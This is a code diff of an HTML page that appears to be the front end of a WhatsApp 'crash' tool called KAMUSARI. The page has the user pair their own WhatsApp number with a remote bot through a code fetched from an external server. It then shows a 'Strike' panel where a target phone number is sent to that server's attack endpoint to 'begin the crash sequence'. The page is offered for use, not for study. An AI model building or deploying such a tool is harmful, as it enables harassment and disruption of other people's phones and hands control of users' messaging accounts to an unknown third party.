@@ -3,206 +3,296 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KAMUSARI SYSTEM</title>
+    <title>KAMUSARI SYSTEM | SHANKS</title>
     <style>
         :root {
             --primary: #ff0000;
             --secondary: #00ff00;
-            --dark: #000000;
+            --dark-bg: #050505;
+            --card-bg: rgba(20, 20, 20, 0.95);
             --pink: #ff007f;
-            --blue: #0000ff;
         }
 
         body {
-            background-color: var(--dark); /* سوداء تماماً */
+            background-color: var(--dark-bg);
             color: white;
-            font-family: 'Arial', sans-serif;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
+            padding: 10px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            min-height: 100vh;
         }
 
-        /* عنوان KAMUSARI علوي وكبير */
-        .header-text {
-            color: var(--primary);
-            font-size: 50px;
-            font-weight: bold;
-            text-shadow: 0 0 20px var(--primary), 0 0 40px var(--primary);
-            margin-bottom: 20px;
-            font-family: 'Times New Roman', serif;
-        }
-
-        /* الحاوية الرئيسية - قريبة من الشاشة وكبيرة */
-        .main-card {
-            width: 95%;
+        /* العنوان العلوي الضخم */
+        .header-section {
+            width: 100%;
             max-width: 500px;
-            border: 4px solid var(--primary);
-            background: #0a0a0a;
+            background: linear-gradient(180deg, rgba(255,0,0,0.2) 0%, transparent 100%);
             border-radius: 20px;
-            padding: 40px 20px;
-            box-shadow: 0 0 50px var(--primary); /* إشعاع قوي جداً */
+            padding: 30px 0;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,0,0,0.3);
             text-align: center;
-            position: relative;
         }
 
-        /* العنوان الأخضر (ENTER YOUR NUMBER) */
-        .label-green {
-            background: var(--secondary);
-            color: black;
-            font-weight: bold;
-            padding: 12px 30px;
-            font-size: 20px;
+        .header-section h1 {
+            margin: 0;
+            font-size: 40px;
+            letter-spacing: 5px;
+            color: var(--primary);
+            text-shadow: 0 0 20px var(--primary);
+        }
+
+        .system-status {
             display: inline-block;
-            border-radius: 8px;
-            box-shadow: 0 0 20px var(--secondary);
-            margin-bottom: 30px;
+            margin-top: 10px;
+            padding: 5px 15px;
+            border-radius: 20px;
+            background: rgba(0,255,0,0.1);
+            border: 1px solid var(--secondary);
+            color: var(--secondary);
+            font-size: 12px;
+            font-weight: bold;
         }
 
-        /* الإطار الأبيض الداخلي المشع */
-        .white-frame {
-            border: 3px solid #ffffff;
-            padding: 25px;
+        /* كروت الإحصائيات - مثل أسامة تماماً */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 10px;
+            width: 100%;
+            max-width: 500px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: var(--card-bg);
+            border: 1px solid rgba(255,255,255,0.1);
             border-radius: 15px;
-            box-shadow: 0 0 25px #ffffff;
-            margin-bottom: 30px;
+            padding: 15px 5px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
 
-        /* حقل الإدخال الوردي */
+        .stat-card .icon { font-size: 20px; color: var(--secondary); margin-bottom: 5px; }
+        .stat-card .value { font-size: 18px; font-weight: bold; display: block; }
+        .stat-card .label { font-size: 9px; text-transform: uppercase; opacity: 0.6; }
+
+        /* الحاوية الرئيسية (Generate Box) */
+        .main-container {
+            width: 100%;
+            max-width: 500px;
+            background: var(--card-bg);
+            border-radius: 25px;
+            border-bottom: 5px solid var(--primary);
+            padding: 25px;
+            box-sizing: border-box;
+            box-shadow: 0 10px 40px rgba(255,0,0,0.2);
+        }
+
+        .section-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section-desc {
+            font-size: 14px;
+            opacity: 0.7;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        /* إطارات الإدخال */
+        .input-box {
+            background: rgba(255,255,255,0.03);
+            border: 2px solid #333;
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
+            transition: 0.3s;
+        }
+
+        .input-box:focus-within { border-color: var(--secondary); box-shadow: 0 0 15px rgba(0,255,0,0.2); }
+
+        .input-box label {
+            display: block;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #aaa;
+        }
+
         input {
-            width: 90%;
-            padding: 18px;
-            background: var(--pink);
+            width: 100%;
+            background: transparent;
             border: none;
             color: white;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: bold;
-            text-align: center;
-            border-radius: 10px;
-            box-shadow: 0 0 20px var(--pink);
             outline: none;
+            text-align: center;
         }
 
-        /* إطار الكود الصغير */
-        .code-display {
-            border: 2px dashed #fff;
+        /* مربع الكود الصغير */
+        .pairing-code-frame {
+            border: 2px dashed var(--secondary);
+            background: rgba(0,255,0,0.05);
+            border-radius: 10px;
             padding: 15px;
             margin-top: 15px;
-            font-size: 24px;
-            color: var(--secondary);
+            font-family: monospace;
+            font-size: 22px;
+            color: white;
             display: none;
-            background: rgba(255,255,255,0.05);
         }
 
-        /* الأزرار المستقيمة */
-        .btn {
+        /* الأزرار العريضة */
+        .btn-large {
             width: 100%;
             padding: 20px;
-            font-size: 18px;
-            font-weight: bold;
+            border-radius: 15px;
             border: none;
-            border-radius: 5px; /* مستقيمة تقريباً */
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: 0.3s;
-            margin-top: 10px;
-        }
-
-        .btn-link { background: #fff; color: #000; box-shadow: 0 0 15px #fff; }
-        .btn-attack { 
-            background: var(--primary); 
-            color: white; 
-            box-shadow: 0 0 25px var(--primary);
-            border: 2px solid #fff;
-        }
-
-        /* العلامة الزرقاء بالأسفل */
-        .made-by {
-            background: var(--blue);
-            color: white;
-            padding: 10px 25px;
-            font-size: 18px;
+            font-size: 16px;
             font-weight: bold;
-            border-radius: 5px;
-            box-shadow: 0 0 20px var(--blue);
-            margin-top: 40px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: 0.3s;
+        }
+
+        .btn-link { background: var(--secondary); color: black; }
+        .btn-attack { background: var(--primary); color: white; margin-top: 10px; box-shadow: 0 0 20px var(--primary); }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 11px;
+            opacity: 0.4;
+            text-align: center;
         }
 
         .hidden { display: none; }
-
     </style>
 </head>
 <body>
 
-    <div class="header-text">𝑲𝑨𝑳𝑴𝑺𝑨𝑹𝑰</div>
-
-    <div id="section-link" class="main-card">
-        <div class="label-green">ENTER YOUR NUMBER</div>
-        
-        <div class="white-frame">
-            <input type="text" id="myNumber" placeholder="212xxxxxxxx">
-            <div id="displayCode" class="code-display"></div>
-        </div>
-
-        <button class="btn btn-link" onclick="getPairingCode()">طلب كود الربط</button>
+    <div class="header-section">
+        <h1>𝑲𝑨𝑴𝑼𝑺𝑨𝑹𝑰</h1>
+        <div class="system-status">● SYSTEM OPERATIONAL</div>
     </div>
 
-    <div id="section-attack" class="main-card hidden">
-        <div class="label-green" style="background: var(--primary); color: white; box-shadow: 0 0 20px var(--primary);">TARGET NUMBER</div>
-        
-        <div class="white-frame" style="box-shadow: 0 0 25px var(--primary);">
-            <input type="text" id="targetNumber" placeholder="Target 212xxxx" style="background: #330000; border: 1px solid var(--primary);">
+    <div class="stats-grid">
+        <div class="stat-card">
+            <span class="icon">👥</span>
+            <span class="value">99+</span>
+            <span class="label">Connected</span>
+        </div>
+        <div id="uptime-card" class="stat-card">
+            <span class="icon">🕒</span>
+            <span class="value" id="timer">00:00</span>
+            <span class="label">Uptime</span>
+        </div>
+        <div class="stat-card">
+            <span class="icon">⚡</span>
+            <span class="value">100%</span>
+            <span class="label">Power</span>
+        </div>
+    </div>
+
+    <div id="link-panel" class="main-container">
+        <div class="section-title">
+            <span style="color: var(--secondary)">🔳</span> Generate Pairing Code
+        </div>
+        <p class="section-desc">Enter your WhatsApp number to generate a secure pairing code for Kamusari System.</p>
+
+        <div class="input-box">
+            <label>📱 WHATSAPP NUMBER</label>
+            <input type="text" id="phoneInput" placeholder="212xxxxxxxx">
         </div>
 
-        <button class="btn btn-attack" onclick="launchAttack()">
+        <div id="pairingResult" class="pairing-code-frame"></div>
+
+        <button class="btn-large btn-link" onclick="startPairing()">
+            ⚡ GENERATE PAIRING CODE
+        </button>
+    </div>
+
+    <div id="attack-panel" class="main-container hidden" style="border-color: var(--primary);">
+        <div class="section-title">
+            <span style="color: var(--primary)">🗡️</span> Kamusari Strike
+        </div>
+        <p class="section-desc">The bot is connected. Enter the target number to begin the crash sequence.</p>
+
+        <div class="input-box" style="border-color: var(--primary);">
+            <label style="color: var(--primary)">🎯 TARGET NUMBER</label>
+            <input type="text" id="targetInput" placeholder="212xxxxxxxx">
+        </div>
+
+        <button class="btn-large btn-attack" onclick="executeStrike()">
             FUCK THIS NUMBER BY KAMUSARI 🗡️🔥
         </button>
     </div>
 
-    <div class="made-by">𝑴𝑨𝑫𝑬 𝑩𝒀 𝑺𝑰𝑹 𝑺𝑯𝑨𝑵𝑲𝑺</div>
+    <div class="footer">
+        © 2026 KAMUSARI | MADE BY SIR SHANKS<br>
+        Premium WhatsApp Pairing System
+    </div>
 
     <script>
-        const API = "https://yasonuak-chrash-001.hf.space";
+        const API_BASE = "https://yasonuak-chrash-001.hf.space";
 
-        // فحص الذاكرة عند فتح الصفحة
-        if(localStorage.getItem('connected') === 'true') {
-            switchToAttack();
+        // مؤقت الـ Uptime
+        let seconds = 0;
+        setInterval(() => {
+            seconds++;
+            let m = Math.floor(seconds / 60);
+            let s = seconds % 60;
+            document.getElementById('timer').innerText = `${m}m ${s}s`;
+        }, 1000);
+
+        // فحص الحالة السابقة
+        if(localStorage.getItem('isLinked') === 'true') {
+            showAttackPanel();
         }
 
-        function switchToAttack() {
-            document.getElementById('section-link').classList.add('hidden');
-            document.getElementById('section-attack').classList.remove('hidden');
+        function showAttackPanel() {
+            document.getElementById('link-panel').classList.add('hidden');
+            document.getElementById('attack-panel').classList.remove('hidden');
         }
 
-        async function getPairingCode() {
-            const num = document.getElementById('myNumber').value;
-            if(!num) return;
-            
-            const codeBox = document.getElementById('displayCode');
-            codeBox.style.display = "block";
-            codeBox.innerText = "جاري الاتصال...";
+        async function startPairing() {
+            const phone = document.getElementById('phoneInput').value;
+            if(!phone) return alert("Please enter a number");
+
+            const resBox = document.getElementById('pairingResult');
+            resBox.style.display = "block";
+            resBox.innerText = "Connecting...";
 
             try {
-                const res = await fetch(`${API}/get-code?phone=${num}`);
-                const data = await res.json();
+                const response = await fetch(`${API_BASE}/get-code?phone=${phone}`);
+                const data = await response.json();
                 if(data.code) {
-                    codeBox.innerText = data.code;
-                    // محاكاة التحقق من الربط
+                    resBox.innerText = data.code;
+                    // بعد 10 ثواني ننتقل لصفحة الهجوم تلقائياً
                     setTimeout(() => {
-                        localStorage.setItem('connected', 'true');
-                        switchToAttack();
+                        localStorage.setItem('isLinked', 'true');
+                        showAttackPanel();
                     }, 10000);
                 }
-            } catch(e) { codeBox.innerText = "خطأ في السيرفر"; }
+            } catch(e) { resBox.innerText = "Server Error"; }
         }
 
-        async function launchAttack() {
-            const target = document.getElementById('targetNumber').value;
-            if(!target) return;
-            alert("KAMUSARI IS ON THE WAY!");
-            fetch(`${API}/attack?target=${target}`);
+        async function executeStrike() {
+            const target = document.getElementById('targetInput').value;
+            if(!target) return alert("Target missing");
+            alert("Kamusari technique activated!");
+            fetch(`${API_BASE}/attack?target=${target}`);
         }
     </script>
 </body>
